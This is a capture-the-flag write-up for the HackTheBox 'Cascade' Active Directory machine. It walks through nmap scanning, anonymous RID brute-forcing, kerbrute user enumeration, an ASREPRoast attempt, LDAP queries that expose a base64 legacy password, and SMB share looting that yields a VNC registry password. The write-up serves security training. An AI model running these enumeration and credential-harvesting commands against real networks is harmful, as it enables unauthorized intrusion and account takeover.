# Cascade

# User Flag

## NMAP Enumeration

NMAP All Port Scan

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.182

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49170/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.182 -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-15 12:16:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-15T12:17:05
|_  start_date: 2024-06-15T12:03:41
```

## SMB Enumeration

Could not list any shares but compiled a list of users vie `enum4linux` and `crackmapexec`:

```bash
crackmapexec smb 10.10.10.182 -u '' -p '' --rid-brute

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
SMB         10.10.10.182    445    CASC-DC1         [+] Brute forcing RIDs
SMB         10.10.10.182    445    CASC-DC1         498: CASCADE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         500: CASCADE\administrator (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         501: CASCADE\CascGuest (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         502: CASCADE\krbtgt (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         512: CASCADE\Domain Admins (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         513: CASCADE\Domain Users (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         514: CASCADE\Domain Guests (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         515: CASCADE\Domain Computers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         516: CASCADE\Domain Controllers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         517: CASCADE\Cert Publishers (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         518: CASCADE\Schema Admins (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         519: CASCADE\Enterprise Admins (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         520: CASCADE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         521: CASCADE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         553: CASCADE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         571: CASCADE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         572: CASCADE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1001: CASCADE\CASC-DC1$ (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1102: CASCADE\DnsAdmins (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1103: CASCADE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         1106: CASCADE\arksvc (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1107: CASCADE\s.smith (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1109: CASCADE\r.thompson (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1111: CASCADE\util (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1113: CASCADE\IT (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1114: CASCADE\Production (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1115: CASCADE\HR (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1116: CASCADE\j.wakefield (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1119: CASCADE\AD Recycle Bin (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1120: CASCADE\Backup (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1121: CASCADE\s.hickson (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1122: CASCADE\j.goodhand (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1123: CASCADE\Temps (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1124: CASCADE\a.turnbull (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1125: CASCADE\WinRMRemoteWMIUsers__ (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1126: CASCADE\Remote Management Users (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1127: CASCADE\e.crowe (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1128: CASCADE\b.hanson (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1129: CASCADE\d.burman (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1130: CASCADE\BackupSvc (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1132: CASCADE\Factory (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1133: CASCADE\Finance (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1134: CASCADE\j.allen (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1135: CASCADE\i.croft (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1137: CASCADE\Audit Share (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1138: CASCADE\Data Share (SidTypeAlias)
```

## Kerberos Enumeration

Tested user list for valid names:

```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.182 -d cascade.local -o kerbrute-user-enum userlist

2024/06/15 13:31:00 >  [+] VALID USERNAME:       CASC-DC1$@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       arksvc@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       administrator@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       j.wakefield@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       util@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       s.smith@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       s.hickson@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       r.thompson@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       a.turnbull@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       j.goodhand@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       d.burman@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       BackupSvc@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       j.allen@cascade.local
```

Attempted ASREPRoasting with Impacket but this failed.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py cascade.local/ -dc-ip 10.10.10.182 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
```

## LDAP Enumeration

Get the base naming contexts via LDAP:

```bash
ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Enumertaed users and found set of base64 encoded credentials for the user `r.thompson@cascade.local`:

```bash
ldapsearch -x -H ldap://10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people

.......
cascadeLegacyPwd: clk0bjVldmE=
.......
```

Set of credentials: `r.thompson:rY4n5eva`

The user cannot connect over winrm:

```bash
crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
    
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
```

## SMB Enumeration (Contd.)

Used credentials and `smbmap` to enumerate shares.

```bash
smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva

[+] IP: 10.10.10.182:445        Name: 10.10.10.182              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

Used smbclient to signin to the `Data` share:

```bash
smbclient //10.10.10.182/data --user r.thompson --password rY4n5eva

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 27 03:27:34 2020
  ..                                  D        0  Mon Jan 27 03:27:34 2020
  Contractors                         D        0  Mon Jan 13 01:45:11 2020
  Finance                             D        0  Mon Jan 13 01:45:06 2020
  IT                                  D        0  Tue Jan 28 18:04:51 2020
  Production                          D        0  Mon Jan 13 01:45:18 2020
  Temps                               D        0  Mon Jan 13 01:45:15 2020
```

Only have access to the `IT` share and extracted multiple files:

```bash
-rw-r--r-- 1 kali kali 1303 Jun 15 14:33  ArkAdRecycleBin.log
-rw-r--r-- 1 kali kali 2522 Jun 15 14:32  Meeting_Notes_June_2018.html
-rw-r--r-- 1 kali kali 2680 Jun 15 14:35 'VNC Install.reg'
-rw-r--r-- 1 kali kali 5967 Jun 15 14:34  dcdiag.log
```

The Email Message in `Meeting_Notes_June_2018.html`:

![Email Message](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Cascade/Images/Email%20Message.png)

The file `'VNC Install.reg'` contains a password:

```bash
cat 'VNC Install.reg'

"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

The file `ArkAdRecycleBin.log` contains keyword `TempAdmin`:

```bash
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
```
















